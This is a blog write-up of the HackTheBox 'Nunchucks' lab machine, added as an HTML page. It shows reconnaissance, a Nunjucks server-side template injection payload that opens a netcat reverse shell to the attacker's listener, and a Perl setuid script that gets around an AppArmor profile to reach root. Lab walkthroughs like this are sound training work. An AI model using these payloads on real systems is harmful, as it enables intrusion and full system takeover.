@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HackTheBox: Nunchucks — Satej Chaudhari</title>
+  <meta name="description" content="HackTheBox Nunchucks walkthrough — a Nunjucks server-side template injection behind a vhost gives a reverse shell, and a Perl setuid capability combined with a weak AppArmor profile escalates to root.">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script>
+  (function(){
+    try{var t=localStorage.getItem('theme');if(t==='light'||t==='dark')document.documentElement.setAttribute('data-theme',t);}catch(e){}
+    document.addEventListener('DOMContentLoaded',function(){
+      var b=document.querySelector('.theme-toggle');
+      if(b)b.addEventListener('click',function(){
+        var d=document.documentElement,c=d.getAttribute('data-theme')||'dark',n=c==='dark'?'light':'dark';
+        d.setAttribute('data-theme',n);try{localStorage.setItem('theme',n);}catch(e){}
+      });
+      var nt=document.querySelector('.nav-toggle'),nv=document.querySelector('.site-nav');
+      if(nt&&nv&&!nt.dataset.bound){nt.dataset.bound='1';nt.addEventListener('click',function(){var o=nv.classList.toggle('open');nt.setAttribute('aria-expanded',o?'true':'false');});}
+    });
+  })();
+  </script>
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="wrap-wide">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SC</span>
+        <span class="brand-name">Satej Chaudhari</span>
+      </a>
+      <nav class="site-nav">
+        <a href="../index.html">Home</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../writeups.html">Writeups</a>
+      </nav>
+      <button class="theme-toggle" aria-label="Toggle light and dark theme" title="Toggle theme">
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+      </button>
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      </button>
+    </div>
+  </header>
+
+  <main class="wrap post">
+    <a class="post-back" href="../writeups.html">&larr; back to writeups</a>
+
+    <article>
+      <header class="post-header">
+        <span class="tag">HackTheBox</span>
+        <h1 class="post-title">HackTheBox: Nunchucks</h1>
+        <p class="post-meta">
+          <time datetime="2026-10-02">2026-10-02</time>
+          <span>&middot; 7 min read</span>
+        </p>
+      </header>
+
+      <div class="post-body">
+
+        <p><strong>Nunchucks</strong> is a Linux box: a Nunjucks <strong>server-side template injection</strong> behind a vhost gives a reverse shell, and a Perl binary with the <code>setuid</code> capability — combined with a weak AppArmor profile — escalates to root.</p>
+
+        <h2>Reconnaissance</h2>
+
+        <pre><code>nmap -sC -sV -p22,80,443 10.10.11.122
+
+22/tcp  open  ssh      OpenSSH 8.2p1
+80/tcp  open  http     nginx 1.18.0  (redirects to https://nunchucks.htb/)
+443/tcp open  ssl/http nginx 1.18.0
+|_ssl-cert: ... DNS:nunchucks.htb</code></pre>
+
+        <pre><code>echo &quot;10.10.11.122 nunchucks.htb&quot; | sudo tee -a /etc/hosts</code></pre>
+
+        <p>Fuzzing virtual hosts turns up a <code>store</code> subdomain:</p>
+
+        <pre><code>ffuf -u https://FUZZ.nunchucks.htb/ -H &quot;Host: FUZZ.nunchucks.htb&quot; -w common.txt
+
+store   [Status: 200, Size: 4029]</code></pre>
+
+        <h2>SSTI → reverse shell</h2>
+
+        <p>The store's sign-up (email) field is vulnerable to server-side template injection, confirmed with the classic <code>{{7*7}}</code> returning <code>49</code>. The stack is Node.js with the Nunjucks template engine.</p>
+
+        <figure>
+          <img src="../assets/img/htb-nunchucks/img1.png" alt="Confirming SSTI with {{7*7}} evaluating to 49">
+          <figcaption><code>{{7*7}}</code> is evaluated server-side — SSTI confirmed.</figcaption>
+        </figure>
+
+        <p>Using a known Nunjucks SSTI payload (e.g. the <code>node-nunjucks-ssti</code> nuclei template) through Burp, arbitrary files can be read, then command execution achieved:</p>
+
+        <figure>
+          <img src="../assets/img/htb-nunchucks/img2.png" alt="Reading files via the Nunjucks SSTI payload in Burp">
+          <figcaption>File read through the Nunjucks SSTI payload in Burp Repeater.</figcaption>
+        </figure>
+
+        <p>A full RCE payload spawns a reverse shell to a waiting listener:</p>
+
+        <pre><code>{&quot;email&quot;:&quot;{{range.constructor(\&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.23 4444 &gt; /tmp/f&#x27;)\&quot;)()}}&quot;}</code></pre>
+
+        <p>That lands a shell as <code>david</code>; upgrade it and grab the user flag:</p>
+
+        <pre><code>script /dev/null bash
+david@nunchucks:~$ cat user.txt</code></pre>
+
+        <h2>Root — Perl setuid capability + AppArmor bypass</h2>
+
+        <p>Enumerating capabilities shows Perl carries <code>cap_setuid+ep</code>:</p>
+
+        <pre><code>getcap -r /
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/ping = cap_net_raw+ep</code></pre>
+
+        <p>Perl can therefore set UID 0 and run commands as root — but a direct read of the flag is denied:</p>
+
+        <pre><code>perl -e &#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;whoami&quot;;&#x27;
+root
+
+perl -e &#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;cat /root/root.txt&quot;;&#x27;
+cat: /root/root.txt: Permission Denied</code></pre>
+
+        <p>The block is an AppArmor profile attached to <code>/usr/bin/perl</code>, which denies <code>/root/*</code> and limits which binaries Perl may exec:</p>
+
+        <pre><code>cat /etc/apparmor.d/usr.bin.perl
+/usr/bin/perl {
+  capability setuid,
+  deny /root/* rwx,
+  deny /etc/shadow rwx,
+  /usr/bin/id   mrix,
+  /usr/bin/cat  mrix,
+  ...
+}</code></pre>
+
+        <blockquote>The profile confines the <code>/usr/bin/perl</code> binary, but AppArmor does not apply that profile to a Perl <em>script</em> executed directly. So a <code>#!/usr/bin/perl</code> script with the setuid payload runs unconfined — a classic AppArmor scoping gap (the payload itself is standard GTFOBins).</blockquote>
+
+        <pre><code>echo &#x27;#!/usr/bin/perl
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec &quot;/bin/bash&quot;;&#x27; &gt; exploit.pl
+chmod +x exploit.pl
+./exploit.pl
+root@nunchucks:/tmp# whoami
+root</code></pre>
+
+        <p>That gives a full root shell and the root flag.</p>
+
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap-wide">
+      <p>&copy; 2026 Satej Chaudhari</p>
+      <div class="footer-links">
+        <a href="../writeups.html">Writeups</a>
+        <a href="../theory.html">Theory</a>
+<a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../disclaimer.html">Disclaimer</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
